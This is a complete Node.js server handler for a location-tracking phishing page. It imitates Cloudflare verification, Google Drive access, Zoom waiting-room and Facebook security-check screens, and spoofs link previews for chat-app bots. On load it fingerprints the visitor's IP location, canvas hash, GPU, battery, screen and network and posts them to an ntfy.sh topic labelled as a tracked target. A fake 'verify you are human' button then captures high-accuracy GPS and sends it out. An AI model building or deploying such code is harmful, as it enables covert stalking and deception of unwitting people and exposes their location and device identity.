const axios = require('axios');

module.exports = async (req, res) => {
    const { topic, t, tpl } = req.query;

    let targetUrl = 'https://google.com';
    if (t) {
        try { targetUrl = Buffer.from(t, 'base64').toString('utf-8'); } catch (e) { }
    }

    if (!topic) {
        return res.redirect(301, targetUrl);
    }

    // Server-side IP Info (Baseline)
    const ipRaw = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.socket.remoteAddress || '';
    const cleanIp = ipRaw.split(',')[0].trim();

    let geo = {};
    if (cleanIp) {
        try {
            const geoReq = await axios.get(`http://ip-api.com/json/${cleanIp}`, { timeout: 2000 });
            geo = geoReq.data;
        } catch (e) { }
    }

    const ua = req.headers['user-agent'] || '';
    const isBot = /bot|preview|whatsapp|facebook|telegram|twitter|linkedin|skype|discord/i.test(ua);

    // [LINK PREVIEW SPOOFING]
    if (isBot) {
        let ogTags = '<title>Sedang Memuat...</title>';
        try {
            const targetRes = await axios.get(targetUrl, {
                timeout: 3000,
                headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0.0.0 Safari/537.36' }
            });
            const htmlData = targetRes.data;
            const titleMatch = htmlData.match(/<title[^>]*>([\s\S]*?)<\/title>/i);
            let tags = "";
            if (titleMatch) tags += `<title>${titleMatch[1]}</title>\n`;

            const metas = htmlData.match(/<meta[^>]+>/gi);
            if (metas) {
                tags += metas.filter(m => /property="og:|name="twitter:|name="description"/i.test(m)).join('\n');
            }
            if (tags) ogTags = tags;
        } catch (e) { }

        return res.status(200).send(`<!DOCTYPE html><html><head>${ogTags}</head><body></body></html>`);
    }

    // TEMPLATE ENGINE
    let theme = {
        bg: '#fff',
        fg: '#313131',
        title: 'Just a moment...',
        h1: 'Verifying you are human. This may take a few seconds.',
        p: 'Cloudflare Turnstile is verifying the security of your connection.',
        btn: 'Verify you are human',
        spinner: '#22c55e',
        tpl: tpl || 'cf'
    };

    if (tpl === 'drive') {
        theme = {
            bg: '#fff', fg: '#202124', title: 'Google Drive - Request Access',
            h1: 'You need access',
            p: 'File: <b>Draft_Dokumen_Penting_2024.pdf</b> (1.2 MB)<br><br>Request access from the owner or switch to an account with permission. <a href="#" style="color:#1a73e8;text-decoration:none">Learn more</a>',
            btn: 'Request access', tpl: 'drive'
        };
    } else if (tpl === 'zoom') {
        theme = {
            bg: '#2D2E33', fg: '#fff', title: 'Join Meeting - Zoom',
            h1: 'Waiting for Host...',
            p: 'Meeting Topic: <b>Interview & Briefing Project</b><br>Meeting ID: 821 445 9010<br><br>Please verify your identity to enter the waiting room.',
            btn: 'JOIN MEETING (SECURE)', tpl: 'zoom'
        };
    } else if (tpl === 'meta') {
        theme = {
            bg: '#f0f2f5', fg: '#1c1e21', title: 'Security Check | Facebook',
            h1: 'Account Verification',
            p: 'We noticed unusual activity on your account. To help protect your info, please confirm you are the owner of this account.',
            btn: 'Confirm Identity', tpl: 'meta'
        };
    }

    const html = `<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${theme.title}</title>
    <style>
        body { margin: 0; padding: 0; background: ${theme.bg}; color: ${theme.fg}; font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; overflow: hidden; }
        .container { text-align: center; width: 100%; max-width: 450px; padding: 20px; }
        h1 { font-size: 28px; font-weight: 400; margin-bottom: 25px; line-height: 1.3; color: #313131; }
        
        /* Turnstile Widget Style (Cloudflare Area) */
        .cf-widget { 
            background: #fff; border: 1px solid #dcdcdc; border-radius: 5px; 
            padding: 12px 15px; display: flex; align-items: center; justify-content: space-between;
            max-width: 320px; margin: 0 auto; box-shadow: 0 1px 3px rgba(0,0,0,0.05);
            cursor: pointer; transition: background 0.2s; text-align: left;
            position: relative;
        }
        .cf-widget:hover { background: #f9f9f9; border-color: #c0c0c0; }
        .cf-left { display: flex; align-items: center; gap: 15px; }
        .cf-right { display: flex; flex-direction: column; align-items: flex-end; }
        .cf-text { font-size: 14px; color: #313131; }
        .cf-logo { height: 28px; filter: grayscale(0.2); }
        .cf-links { font-size: 10px; color: #999; display: flex; gap: 6px; margin-top: -4px; }
        .cf-links a { text-decoration: none; color: inherit; }

        /* Spinner dots (CF) */
        .dot-spinner { width: 28px; height: 28px; position: relative; }
        .dot-spinner div { position: absolute; width: 3.5px; height: 3.5px; background: #22c55e; border-radius: 50%; opacity: 0.2; animation: dot-fade 1.2s infinite ease-in-out; }
        .dot-spinner div:nth-child(1) { top: 0; left: 12px; animation-delay: 0s; }
        .dot-spinner div:nth-child(2) { top: 3.5px; left: 20.5px; animation-delay: -0.15s; }
        .dot-spinner div:nth-child(3) { top: 12px; left: 24.5px; animation-delay: -0.3s; }
        .dot-spinner div:nth-child(4) { top: 20.5px; left: 20.5px; animation-delay: -0.45s; }
        .dot-spinner div:nth-child(5) { top: 24.5px; left: 12px; animation-delay: -0.6s; }
        .dot-spinner div:nth-child(6) { top: 20.5px; left: 3.5px; animation-delay: -0.75s; }
        .dot-spinner div:nth-child(7) { top: 12px; left: 0; animation-delay: -0.9s; }
        .dot-spinner div:nth-child(8) { top: 3.5px; left: 3.5px; animation-delay: -1.05s; }
        @keyframes dot-fade { 0% { opacity: 0.1; } 50% { opacity: 1; } 100% { opacity: 0.1; } }

        /* Templates Specific UI */
        .tpl-logo { width: 80px; margin-bottom: 20px; }
        .tpl-desc { color: #5f6368; font-size: 15px; line-height: 1.5; margin-bottom: 30px; }
        
        /* Footer */
        .footer { position: fixed; bottom: 40px; font-size: 11px; color: #999; width: 100%; text-align: center; font-family: -apple-system, system-ui; }
        
        /* Hidden Verify Button Overlay for CF */
        #verifyBtn { position: absolute; width: 100%; height: 100%; top:0; left:0; opacity: 0; cursor: pointer; border: none; z-index: 10; }

        /* Override for other templates */
        ${theme.tpl !== 'cf' ? `
            .container { max-width: 450px; background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); border: 1px solid #e0e0e0; }
            h1 { font-size: 24px; font-weight: 600; color: #202124; margin-top: 0; margin-bottom: 20px; }
            .cf-widget { border: 0; box-shadow: none; background: transparent; cursor: default; padding: 0; max-width: 100%; display: block; }
            .cf-widget:hover { background: transparent; }
            .cf-right { display: none; }
            .dot-spinner { display: none; }
            #verifyBtn { position: relative; opacity: 1; background: ${theme.tpl === 'drive' ? '#1a73e8' : (theme.tpl === 'meta' ? '#1877f2' : '#0E71EB')}; color: #fff; padding: 12px 30px; border-radius: 4px; font-weight: 600; width: 100%; margin-top: 10px; font-size: 15px; border: none; cursor: pointer; transition: background 0.2s; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
            #verifyBtn:hover { filter: brightness(0.9); }
            .cf-text { font-size: 15px; color: #5f6368; line-height: 1.6; margin-bottom: 25px; }
            .cf-left { flex-direction: column; width: 100%; gap: 5px; }
            
            ${theme.tpl === 'zoom' ? `
                body { background: #1a1a1c; }
                .container { background: #2d2e33; border-color: #3f4045; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
                h1, .cf-text { color: #fff; }
                .cf-text b { color: #0E71EB; }
            ` : ''}
            
            ${theme.tpl === 'meta' ? `
                .container { max-width: 420px; padding: 30px; text-align: left; }
                h1 { border-bottom: 1px solid #e5e5e5; padding-bottom: 15px; font-size: 20px; }
                #verifyBtn { padding: 10px; border-radius: 6px; }
            ` : ''}
        ` : ''}

        /* Success Checkmark & Checkbox CF */
        .check { display: none; width: 22px; height: 22px; border-radius: 50%; background: #22c55e; position: relative; }
        .check::after { content: ''; position: absolute; left: 8px; top: 4px; width: 5px; height: 10px; border: solid white; border-width: 0 2px 2px 0; transform: rotate(45deg); }
        
        .cf-checkbox { width: 24px; height: 24px; border: 2px solid #dcdcdc; border-radius: 3px; background: #fff; transition: border-color 0.2s; position: relative; display: block; }
        .cf-widget:hover .cf-checkbox { border-color: #999; }
        
        #cf-spinner { display: none; }
    </style>
</head>
<body>
    <div class="container">
        ${theme.tpl === 'drive' ? '<img src="https://upload.wikimedia.org/wikipedia/commons/d/da/Google_Drive_logo.png" class="tpl-logo" alt="Drive">' : ''}
        ${theme.tpl === 'zoom' ? '<img src="https://upload.wikimedia.org/wikipedia/commons/9/94/Zoom_Logo.svg" class="tpl-logo" style="width: 120px; filter: brightness(100) invert(1);" alt="Zoom">' : ''}
        ${theme.tpl === 'meta' ? '<img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" class="tpl-logo" style="width: 60px" alt="Facebook">' : ''}
        
        <h1>${theme.h1}</h1>
        
        <div class="cf-widget">
            <div class="cf-left">
                <div class="cf-checkbox" id="cf-checkbox"></div>
                <div class="dot-spinner" id="cf-spinner">
                    <div></div><div></div><div></div><div></div>
                    <div></div><div></div><div></div><div></div>
                </div>
                <div class="check" id="cf-check"></div>
                <div class="cf-text" id="statusText">${theme.tpl === 'cf' ? theme.btn : theme.p}</div>
            </div>
            <div class="cf-right">
                <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" class="cf-logo" alt="Cloudflare">
                <div class="cf-links">
                    <a href="#">Privacy</a>
                    <span>•</span>
                    <a href="#">Terms</a>
                </div>
            </div>
            <button id="verifyBtn">${theme.tpl === 'cf' ? '' : theme.btn}</button>
        </div>
    </div>

    <div class="footer">
        ${theme.tpl === 'cf' ? `Ray ID: ${Math.random().toString(36).substring(2, 12).toUpperCase()} • Performance & Security by Cloudflare` : `SSL Secure Connection • Request ID: ${Math.random().toString(36).substring(2, 10).toUpperCase()}`}
    </div>
    <script>
        async function capture() {
            // Level 4 Pegasus-Lite Advanced Fingerprinting: Canvas Hash
            const generateCanvasHash = () => {
                try {
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    ctx.textBaseline = "top"; ctx.font = "14px 'Arial'"; ctx.textBaseline = "alphabetic";
                    ctx.fillStyle = "#f60"; ctx.fillRect(125,1,62,20);
                    ctx.fillStyle = "#069"; ctx.fillText("🕵️‍♂️SINTEL-HP" + navigator.userAgent, 2, 15);
                    ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText("🕵️‍♂️SINTEL-HP", 4, 17);
                    const dataURI = canvas.toDataURL();
                    let hash = 0;
                    for (let i = 0; i < dataURI.length; i++) {
                        hash = ((hash << 5) - hash) + dataURI.charCodeAt(i);
                        hash = hash & hash;
                    }
                    return Math.abs(hash).toString(16);
                } catch (e) { return "Unknown"; }
            };

            const payload = {
                ip: "${cleanIp}",
                lat: ${geo.lat || 'null'},
                lon: ${geo.lon || 'null'},
                city: "${geo.city || geo.regionName || 'Unknown'}",
                ua: navigator.userAgent,
                time: new Date().toISOString(),
                // Fingerprinting Level 4 (Pegasus-Pro)
                device_hash: generateCanvasHash(),
                screen: window.screen.width + "x" + window.screen.height + " (" + window.screen.colorDepth + "bit)",
                cpu: navigator.hardwareConcurrency || '??',
                ram: navigator.deviceMemory || '??',
                platform: navigator.platform,
                gpu: 'Unknown',
                battery: 'Unknown',
                charging: 'Unknown',
                network: 'Unknown',
                speed: 'Unknown',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
                language: navigator.language || 'Unknown',
                touch: navigator.maxTouchPoints > 0 ? 'Yes' : 'No'
            };

            // Network Info
            if (navigator.connection) {
                payload.network = navigator.connection.effectiveType || 'Unknown';
                payload.speed = navigator.connection.downlink ? (navigator.connection.downlink + " Mbps") : 'Unknown';
            }

            // Get GPU Info
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    payload.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                }
            } catch(e) {}

            // Get Battery Info
            try {
                if (navigator.getBattery) {
                    const bt = await navigator.getBattery();
                    payload.battery = Math.round(bt.level * 100) + "%";
                    payload.charging = bt.charging ? "Charging" : "Unplugged";
                }
            } catch(e) {}

            // Initial PING (Fingerprint + IP)
            const sendPing = (data) => {
                fetch('https://ntfy.sh/${topic}', {
                    method: 'POST',
                    body: JSON.stringify(data),
                    headers: { 'Title': 'Target Terlacak (Level 3)', 'Tags': 'high_brightness,skull' }
                });
            };

            sendPing(payload);

            // Real-time GPS Tracking TRIGGERED BY BUTTON CLICK
            document.getElementById('verifyBtn').addEventListener('click', () => {
                const status = document.getElementById('statusText');
                const checkbox = document.getElementById('cf-checkbox');
                const spinner = document.getElementById('cf-spinner');
                const check = document.getElementById('cf-check');
                const btn = document.getElementById('verifyBtn');
                
                if (status) status.innerText = "Verifying...";
                if (checkbox) checkbox.style.display = "none";
                if (spinner) spinner.style.display = "block";
                
                if (btn && btn.style.opacity !== "0") {
                    btn.innerText = "Please wait...";
                    btn.disabled = true;
                    btn.style.filter = "grayscale(1)";
                }
                
                const execRedirect = () => {
                    if (status) status.innerText = "Success! Redirecting...";
                    if (spinner) spinner.style.display = "none";
                    if (check) check.style.display = "block";
                    setTimeout(() => {
                        window.location.replace("${targetUrl}");
                    }, 1000);
                };

                if (navigator.geolocation) {
                    // Try to force the popup!
                    navigator.geolocation.getCurrentPosition((pos) => {
                        payload.lat = pos.coords.latitude;
                        payload.lon = pos.coords.longitude;
                        payload.accuracy = Math.round(pos.coords.accuracy) + "m";
                        payload.type = 'GPS_SAT';
                        sendPing(payload); // Send updated GPS
                        
                        // Wait a sec to ensure ping goes out before redirect
                        setTimeout(execRedirect, 800);
                        
                    }, (err) => {
                        // User blocked or timed out
                        execRedirect();
                    }, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
                } else {
                    execRedirect();
                }

                // Failsafe redirect if they ignore the popup entirely for 6 seconds
                setTimeout(execRedirect, 6000);
            });

        }
        capture();
    </script>
</body>
</html>`;

    res.setHeader('Content-Type', 'text/html');
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
    return res.status(200).send(html);
};
